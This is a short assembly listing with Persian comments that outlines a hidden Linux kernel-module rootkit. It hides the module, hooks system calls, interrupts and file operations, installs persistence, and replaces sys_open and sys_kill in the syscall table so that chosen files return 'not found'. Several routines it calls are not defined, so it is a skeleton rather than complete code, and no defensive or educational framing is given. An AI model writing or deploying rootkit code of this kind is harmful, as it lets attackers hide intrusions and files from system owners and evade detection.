; ماژول هسته مخفی
section .text

module_init:
    ; مخفی‌سازی ماژول
    call hide_module

    ; نصب هوک‌های سیستمی
    call hook_system_calls
    call hook_interrupts
    call hook_file_operations

    ; فعال‌سازی پایداری
    call install_persistence
    ret

hook_system_calls:
    ; جایگزینی sys_call_table
    mov rdi, sys_call_table
    mov rsi, sys_open
    mov rdx, our_sys_open
    call replace_syscall

    mov rsi, sys_kill
    mov rdx, our_sys_kill
    call replace_syscall
    ret

our_sys_open:
    ; مخفی‌سازی فایل‌های حیاتی
    call get_file_path
    call is_hidden_file
    test al, al
    jnz .hide_file

    ; فراخوانی اصلی
    call [rel original_sys_open]
    ret

.hide_file:
    ; برگرداندن خطا
    mov eax, -ENOENT
    ret
    